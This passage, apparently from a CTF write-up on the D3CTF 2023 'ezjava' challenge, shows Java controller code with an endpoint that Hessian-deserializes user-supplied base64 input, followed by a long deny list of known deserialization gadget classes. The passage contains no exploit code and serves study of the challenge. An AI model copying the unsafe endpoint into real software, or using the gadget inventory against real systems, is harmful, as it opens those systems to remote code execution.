</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Operation</span><span class=p>(</span><span class=n>description</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;return serialized blacklist for client. Client will require blacklist every 10 sec.&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>getBlacklist</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>data</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DefaultSerializer</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>Blacklist</span><span class=p>.</span><span class=na>readBlackList</span><span class=p>(</span><span class=n>Blacklist</span><span class=p>.</span><span class=na>DEFAULT_JDK_SERIALIZE_BLACK_LIST</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=s>&#34;200&#34;</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/blacklist/hessian/get&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Operation</span><span class=p>(</span><span class=n>description</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;get serialized blacklist for registry&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>getHessianBlacklist</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>data</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DefaultSerializer</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>Blacklist</span><span class=p>.</span><span class=na>hessianBlackList</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=s>&#34;200&#34;</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@PostMapping</span><span class=p>({</span><span class=s>&#34;/hessian/deserialize&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Operation</span><span class=p>(</span><span class=n>description</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;deserialize base64Str using hessian&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>deserialize</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>base64Str</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>data</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;200&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serialized</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getDecoder</span><span class=p>().</span><span class=na>decode</span><span class=p>(</span><span class=n>base64Str</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>HessianSerializer</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>serialized</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;deserialize success&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;error: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;500&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=n>code</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><ul><li>/client/status 会去访问 server 的status路由，并且使用 JSON.parseObject 进行解析（更新黑名单）</li><li>/blacklist/jdk/get 返回 jdk_blacklist.txt 黑名单序列化后的数据</li><li>/blacklist/hessian/get 返回 hessian_blacklist.txt 黑名单序列化后的数据</li><li>/hessian/deserialize 接受base64Str参数，将其base64解密后判断是否存在黑名单类后进行hessian2反序列化</li></ul><p><img src=/p/d3ctf-2023-ezjava/2.png width=2138 height=810 loading=lazy alt=img></p><p>BOOT-INF/classes/security/hessian_blacklist.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>bsh</span><span class=p>.</span><span class=na>Interpreter</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>bsh</span><span class=p>.</span><span class=na>XThis</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ch</span><span class=p>.</span><span class=na>qos</span><span class=p>.</span><span class=na>logback</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>db</span><span class=p>.</span><span class=na>DriverManagerConnectionSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ch</span><span class=p>.</span><span class=na>qos</span><span class=p>.</span><span class=na>logback</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>db</span><span class=p>.</span><span class=na>JNDIConnectionSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>clojure</span><span class=p>.</span><span class=na>core$constantly</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>clojure</span><span class=p>.</span><span class=na>main$eval_opt</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>QName</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mchange</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>c3p0</span><span class=p>.</span><span class=na>JndiRefForwardingDataSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mchange</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>c3p0</span><span class=p>.</span><span class=na>WrapperConnectionPoolDataSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>rometools</span><span class=p>.</span><span class=na>rome</span><span class=p>.</span><span class=na>feed</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>EqualsBean</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>rometools</span><span class=p>.</span><span class=na>rome</span><span class=p>.</span><span class=na>feed</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>ToStringBean</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>corba</span><span class=p>.</span><span class=na>se</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>activation</span><span class=p>.</span><span class=na>ServerManagerImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>corba</span><span class=p>.</span><span class=na>se</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>activation</span><span class=p>.</span><span class=na>ServerTableEntry</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>corba</span><span class=p>.</span><span class=na>se</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>presentation</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>InvocationHandlerFactoryImpl</span><span class=p>.</span><span class=na>CustomCompositeInvocationHandlerImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>corba</span><span class=p>.</span><span class=na>se</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>orbutil</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>CompositeInvocationHandlerImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>corba</span><span class=p>.</span><span class=na>se</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>orbutil</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>LinkedInvocationHandler</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>registry</span><span class=p>.</span><span class=na>BindingEnumeration</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>toolkit</span><span class=p>.</span><span class=na>dir</span><span class=p>.</span><span class=na>LazySearchEnumerationImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>bcel</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ClassLoader</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xalan</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>xsltc</span><span class=p>.</span><span class=na>trax</span><span class=p>.</span><span class=na>TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xpath</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>XPathContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xpath</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>objects</span><span class=p>.</span><span class=na>XString</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>rowset</span><span class=p>.</span><span class=na>JdbcRowSetImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>xml</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>bind</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>runtime</span><span class=p>.</span><span class=na>unmarshaller</span><span class=p>.</span><span class=na>Base64Data</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>groovy</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>GString</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>groovy</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>MapEntry</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>Expression</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ProcessBuilder</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>Runtime</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>UnicastRemoteObject</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>security</span><span class=p>.</span><span class=na>SignedObject</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ServiceLoader$LazyIterator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>StringTokenizer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>TreeSet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashSet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javassist</span><span class=p>.</span><span class=na>bytecode</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>Annotation</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javassist</span><span class=p>.</span><span class=na>bytecode</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>AnnotationImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javassist</span><span class=p>.</span><span class=na>bytecode</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>AnnotationMemberValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javassist</span><span class=p>.</span><span class=na>tools</span><span class=p>.</span><span class=na>web</span><span class=p>.</span><span class=na>Viewer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javassist</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>SerializedProxy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>activation</span><span class=p>.</span><span class=na>MimeTypeParameterList</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>imageio</span><span class=p>.</span><span class=na>ImageIO$ContainsFilter</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>imageio</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ServiceRegistry</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>BadAttributeValueExpException</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>ImmutableDescriptor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>remote</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>RMIConnector</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>InitialContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>ldap</span><span class=p>.</span><span class=na>Rdn</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ObjectFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>script</span><span class=p>.</span><span class=na>ScriptEngineManager</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>sound</span><span class=p>.</span><span class=na>sampled</span><span class=p>.</span><span class=na>AudioFileFormat</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>sound</span><span class=p>.</span><span class=na>sampled</span><span class=p>.</span><span class=na>AudioFormat</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>swing</span><span class=p>.</span><span class=na>UIDefaults</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>xml</span><span class=p>.</span><span class=na>transform</span><span class=p>.</span><span class=na>Templates</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>bcel</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ClassLoader</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>beanutils</span><span class=p>.</span><span class=na>BeanComparator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>beanutils</span><span class=p>.</span><span class=na>BeanToPropertyValueTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InvokerTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InvokerTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>fileupload</span><span class=p>.</span><span class=na>disk</span><span class=p>.</span><span class=na>DiskFileItem</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>lang3</span><span class=p>.</span><span class=na>compare</span><span class=p>.</span><span class=na>ObjectToStringComparator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>ibatis</span><span class=p>.</span><span class=na>javassist</span><span class=p>.</span><span class=na>tools</span><span class=p>.</span><span class=na>web</span><span class=p>.</span><span class=na>Viewer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>ibatis</span><span class=p>.</span><span class=na>javassist</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>SerializedProxy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>receivers</span><span class=p>.</span><span class=na>db</span><span class=p>.</span><span class=na>DriverManagerConnectionSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>BasicDataSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>SharedPoolDataSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp2</span><span class=p>.</span><span class=na>BasicDataSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xalan</span><span class=p>.</span><span class=na>xsltc</span><span class=p>.</span><span class=na>trax</span><span class=p>.</span><span class=na>TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xbean</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>context</span><span class=p>.</span><span class=na>ContextUtil$ReadOnlyBinding</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xpath</span><span class=p>.</span><span class=na>XPathContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>bcel</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ClassLoader</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>codehaus</span><span class=p>.</span><span class=na>groovy</span><span class=p>.</span><span class=na>runtime</span><span class=p>.</span><span class=na>MethodClosure</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>eclipse</span><span class=p>.</span><span class=na>jetty</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>log</span><span class=p>.</span><span class=na>LoggerLog</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>autoproxy</span><span class=p>.</span><span class=na>AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>DefaultBeanFactoryPointcutAdvisor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>AspectJAroundAdvice</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>BeanWrapperImpl$BeanPropertyHandler</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>BeanFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>MethodInvokingFactoryBean</span><span class=w>
